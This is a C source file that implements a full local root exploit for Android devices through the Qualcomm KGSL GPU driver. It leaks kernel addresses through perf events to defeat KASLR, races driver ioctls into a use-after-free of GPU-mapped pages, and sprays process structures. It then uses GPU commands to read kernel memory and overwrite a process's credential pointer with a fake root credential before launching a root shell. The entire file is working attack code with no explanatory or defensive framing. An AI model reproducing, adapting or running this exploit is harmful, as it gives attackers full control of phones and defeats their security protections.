#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/select.h>
#include <poll.h>
#include <sys/stat.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_UNCACHED 0
#define KGSL_CACHEMODE_WRITECOMBINE 1
#define KGSL_CACHEMODE_WRITETHROUGH 2
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define VMLINUX_TEXT      0xffffffc010080000ULL
#define VMLINUX_INIT_CRED 0xffffffc012D97D08ULL
#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL

#define CRED_OFF    0x740
#define REAL_CRED_OFF 0x738

#define SPRAY_PIDS 2000
#define SCAN_DWORDS 560

static int kgsl_fd = -1;
static volatile int race_done = 0;
static volatile int dc_civac_works = -1;

static void sigill_handler(int sig) { dc_civac_works = 0; }

static void try_dc_civac(void *addr) {
    if (dc_civac_works == 0) return;
    void *old = signal(SIGILL, sigill_handler);
    __sync_synchronize();
    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
    asm volatile("dsb sy" : : : "memory");
    __sync_synchronize();
    signal(SIGILL, old);
    if (dc_civac_works == -1) dc_civac_works = 1;
}

static void flush_dc_civac_range(void *start, size_t len) {
    if (dc_civac_works != 1) return;
    char *p = (char*)((uintptr_t)start & ~63);
    char *end = (char*)((uintptr_t)start + len);
    for (; p < end; p += 64) try_dc_civac(p);
}

static void die(const char *msg) { perror(msg); exit(1); }

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;

    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size); close(fd);
    printf("    kernel_samples=%d\n", n_ips);

    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }

    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
    uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
    printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
        (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
    return ic_addr;
}

static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    }
    return ret;
}

static void gpuobj_free(int fd, unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static unsigned int create_context(int fd) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73
#define CP_WAIT_MEM_WRITES 0x12
#define CP_EVENT_WRITE 0x46
#define CACHE_FLUSH_TS 0x1C

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);

    prctl(PR_SET_NAME, "TASKUAF!!");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    printf("[*] Phase 0: Early KASLR detection\n");
    uint64_t init_cred_addr = detect_kaslr();
    printf("  init_cred=0x%lX\n", init_cred_addr);

    printf("[*] Phase 1: Setup rbtree\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    printf("  Using alloc_flags=0x%lx (WRITEBACK cache mode)\n", (unsigned long)alloc_flags);
    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);

    printf("[*] Phase 2: Race\n");
    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);

    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
    }
    race_done = 1;
    pthread_join(thr, NULL);

    if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
    printf("[+] Race won! (errno=ENODEV)\n");

    printf("[*] Phase 3: Free UAF\n");
    gpuobj_free(kgsl_fd, uaf_id);
    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n",
        (unsigned long)(UAF_ADDR + 0x1000));

    printf("[*] Phase 4: Reclaim pages\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    printf("[*] Phase 5: Spawning task_struct spray...\n");
    int notify_pipe[2];
    if (pipe(notify_pipe) < 0) die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    usleep(50000);
                    pid_t me = getpid();
                    if (write(notify_pipe[1], &me, sizeof(me)) != sizeof(me)) {
                        int fd = open("/data/local/tmp/rooted", O_CREAT|O_WRONLY, 0666);
                        if (fd >= 0) { write(fd, "1", 1); close(fd); }
                    }
                    write(1, "### ROOT SHELL ACTIVE ###\n", 26);
                    close(notify_pipe[1]);
                    usleep(50000);
                    char buf[4096]; int n;
                    int fd = open("/proc/self/attr/current", O_RDONLY);
                    if (fd >= 0) {
                        write(1, "  SELinux: ", 11);
                        while ((n = read(fd, buf, sizeof(buf))) > 0) write(1, buf, n);
                        write(1, "\n", 1);
                        close(fd);
                    }
                    int sec = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
                    write(1, "  Seccomp: ", 11);
                    char ebuf[32]; int elen = snprintf(ebuf, sizeof(ebuf), "%d\n", sec);
                    write(1, ebuf, elen);
                    int nnp = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);
                    write(1, "  NoNewPrivs: ", 15);
                    elen = snprintf(ebuf, sizeof(ebuf), "%d\n", nnp);
                    write(1, ebuf, elen);
                    write(1, "  uid=", 6);
                    elen = snprintf(ebuf, sizeof(ebuf), "%d euid=%d gid=%d egid=%d\n",
                        getuid(), geteuid(), getgid(), getegid());
                    write(1, ebuf, elen);
                    fd = open("/proc/self/status", O_RDONLY);
                    if (fd >= 0) {
                        n = read(fd, buf, sizeof(buf)-1);
                        close(fd);
                        if (n > 0) {
                            buf[n] = 0;
                            char *lp = buf, *nl;
                            while ((nl = strstr(lp, "\n")) != NULL) {
                                *nl = 0;
                                if (strncmp(lp, "CapPrm:", 7) == 0 || strncmp(lp, "CapEff:", 7) == 0 ||
                                    strncmp(lp, "CapBnd:", 7) == 0 || strncmp(lp, "CapInh:", 7) == 0 ||
                                    strncmp(lp, "Uid:", 4) == 0 || strncmp(lp, "Gid:", 4) == 0) {
                                    write(1, "  ", 2); write(1, lp, nl - lp); write(1, "\n", 1);
                                }
                                lp = nl + 1;
                            }
                        }
                    }
                    write(1, "  Spawning shell...\n", 20);
                    execl("/system/bin/sh", "sh", NULL);
                    write(1, "  sh exec failed: ", 18);
                    elen = snprintf(ebuf, sizeof(ebuf), "%d\n", errno);
                    write(1, ebuf, elen);
                    _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);

    printf("[*] Phase 7: GPU scan for task_structs\n");
    unsigned int ctx_id = create_context(kgsl_fd);
    printf("  context=%u\n", ctx_id);

    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
    uint64_t ib_ga = 0, ib_flags = 0;
    gpuobj_info(kgsl_fd, ib_id, &ib_ga, &ib_flags);
    printf("  IB id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", ib_id,
        (unsigned long)ib_ga, (unsigned long)ib_flags,
        (unsigned long)(ib_flags & KGSL_CACHEMODE_MASK));

    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
    uint64_t dst_ga = 0, dst_flags = 0;
    gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
    printf("  DST id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", dst_id,
        (unsigned long)dst_ga, (unsigned long)dst_flags,
        (unsigned long)(dst_flags & KGSL_CACHEMODE_MASK));

    printf("  Scanning [0x%lx - 0x%lx]...\n",
        (unsigned long)(UAF_ADDR + 0x1000),
        (unsigned long)(UAF_ADDR + UAF_SIZE));

    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
    uint64_t task_pages[16];
    uint32_t task_comm_offs[16];
    int n_task = 0;
    uint64_t cred_pages[32];
    int cred_offs[32];
    int n_cred = 0;
    uint64_t target_task_page = 0;
    uint64_t target_cred_ptr = 0;

    uint64_t scan_start = UAF_ADDR + 0x300000;
    if (scan_start < UAF_ADDR + 0x2000) scan_start = UAF_ADDR + 0x2000;

    for (uint64_t va = scan_start; va < end_va && (n_task < 1 || n_cred < 1); va += 0x1000) {
        if (((va - scan_start) & 0xFFFFF) == 0) { printf("."); fflush(stdout); }
        uint32_t *cmd = (uint32_t *)ib_m;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 4, &dl, &dh);
            split64(va + i * 4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0;
            cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
        __sync_synchronize();

        uint32_t *data = (uint32_t *)dst_m;
        int nz = 0, n_comm = 0, comm_off = -1;
        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
            if (data[i] != 0) nz++;
            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
                if (comm_off < 0) comm_off = i * 4;
                n_comm++;
            }
        }
        if (n_comm > 0) {
            printf("  [TASK_COMM] va=0x%lx nz=%d comm_off=0x%x\n",
                (unsigned long)va, nz, comm_off);
            task_pages[n_task] = va;
            task_comm_offs[n_task] = comm_off;
            n_task++;
            if (target_task_page == 0) {
                target_task_page = va;
                uint64_t cred_ptr = (uint64_t)data[CRED_OFF/4] | ((uint64_t)data[CRED_OFF/4 + 1] << 32);
                if (cred_ptr > 0xffffff8000000000ULL && cred_ptr < 0xffffffffffff0000ULL) {
                    target_cred_ptr = cred_ptr;
                    printf("  [CRED_PTR] = 0x%lx\n", (unsigned long)cred_ptr);
                }
            }
        }
        int cred_off_found = -1;
        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
            int cnt = 0;
            for (int j = 0; j < 8; j++)
                if (data[i + j] == 0x000007D0) cnt++;
            if (cnt >= 4) { cred_off_found = i * 4; break; }
        }
        if (cred_off_found >= 0 && n_cred < 32) {
            printf("  [CRED] va=0x%lx nz=%d off=0x%x\n",
                (unsigned long)va, nz, cred_off_found);
            cred_pages[n_cred] = va;
            cred_offs[n_cred] = cred_off_found;
            n_cred++;
        }
    }
    printf("[*] Scan complete: found %d task_struct pages, %d cred pages\n", n_task, n_cred);
    if (target_task_page == 0) {
        printf("[-] No task_struct with TASKUAF!! found\n");
        goto cleanup;
    }

    printf("[*] Phase 7.5: Allocate fake cred object\n");
    int fake_cred_id = gpuobj_alloc(kgsl_fd, 0x1000, alloc_flags);
    void *fake_cred_m = gpuobj_mmap(kgsl_fd, 0x1000, fake_cred_id);
    uint64_t fake_cred_ga = 0, fake_flags = 0;
    gpuobj_info(kgsl_fd, fake_cred_id, &fake_cred_ga, &fake_flags);
    printf("  fake cred gpuaddr=0x%lx\n", (unsigned long)fake_cred_ga);

    memset(fake_cred_m, 0, 0x1000);
    uint32_t *fc = (uint32_t *)fake_cred_m;
    fc[0x10/4] = 0; fc[0x14/4] = 0; fc[0x18/4] = 0; fc[0x1c/4] = 0;
    fc[0x20/4] = 0; fc[0x24/4] = 0; fc[0x28/4] = 0; fc[0x2c/4] = 0;
    fc[0x30/4] = 0x00000004;
    fc[0x34/4] = 0xFFFFFFFF; fc[0x38/4] = 0x00000003;
    fc[0x3c/4] = 0xFFFFFFFF; fc[0x40/4] = 0x00000003;
    fc[0x44/4] = 0xFFFFFFFF; fc[0x48/4] = 0x00000003;
    fc[0x4c/4] = 0xFFFFFFFF; fc[0x50/4] = 0x00000003;
    fc[0x54/4] = 0xFFFFFFFF; fc[0x58/4] = 0x00000003;
    flush_dc_civac_range(fake_cred_m, 0x1000);

    printf("[*] Phase 8: Overwrite task_struct->cred pointer\n");
    uint64_t task_addr = target_task_page + CRED_OFF;
    uint32_t *cmd = (uint32_t *)ib_m;
    int dw = 0;
    memset(ib_m, 0, 0x10000);
    uint32_t lo, hi;
    split64(task_addr, &lo, &hi);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    split64(fake_cred_ga, &lo, &hi);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) {
        printf("[-] Failed to submit cred pointer overwrite\n");
        goto cleanup;
    }
    if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) {
        printf("[-] Timestamp wait failed\n");
        goto cleanup;
    }
    printf("[+] cred pointer overwritten to fake cred\n");

    flush_dc_civac_range((void*)target_task_page, 0x1000);

    printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
    void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (ev != MAP_FAILED) {
        volatile char *p = (volatile char *)ev;
        for (uint64_t o = 0; o < 0x2000000; o += 64) p[o] = 0;
        munmap(ev, 0x2000000);
    }
    sleep(1);

    printf("[*] Phase 9: Spawning root shell (uid=0)\n");
    printf("  current uid=%u euid=%u\n", getuid(), geteuid());
    fflush(stdout);

    execl("/system/bin/sh", "sh", NULL);
    perror("execl failed");

cleanup:
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    printf("[*] Done.\n");
    return 0;
}
